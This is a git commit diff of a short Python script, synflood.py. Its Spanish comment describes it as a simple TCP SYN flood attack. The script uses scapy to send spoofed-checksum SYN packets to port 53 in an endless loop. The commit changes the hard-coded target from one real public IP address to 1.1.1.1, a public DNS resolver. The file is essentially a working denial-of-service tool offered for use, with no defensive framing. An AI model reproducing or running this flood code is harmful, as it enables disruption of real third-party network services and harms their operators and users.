f523a1bbd3ce3ff37677e22257e9f6c67f946730
hackingyseguridad <antonio_taboada@hotmail.es>
2019-10-09 11:02:13 +0200

    Update synflood.py

--- synflood.py
+++ synflood.py
@@ -1,10 +1,10 @@
 #! /usr/bin/env python
 # Name : Antonio Taboada
 # Website : www.hackingyseguridad.com
-# Description : Simple ataque de inundacion de paquetes TCP SYN con checksun invalido
+# Description : Simple ataque de inundacion de paquetes TCP SYN con checksun invalido 0x1234
 import sys
 from scapy.all import *
-ip=IP(dst="2.136.159.113",frag=0,ttl=64)
+ip=IP(dst="1.1.1.1",frag=0,ttl=64)
 SYN=TCP(sport=RandShort(),dport=53,flags="S",window=29200)
 while True:
     send(ip/SYN)
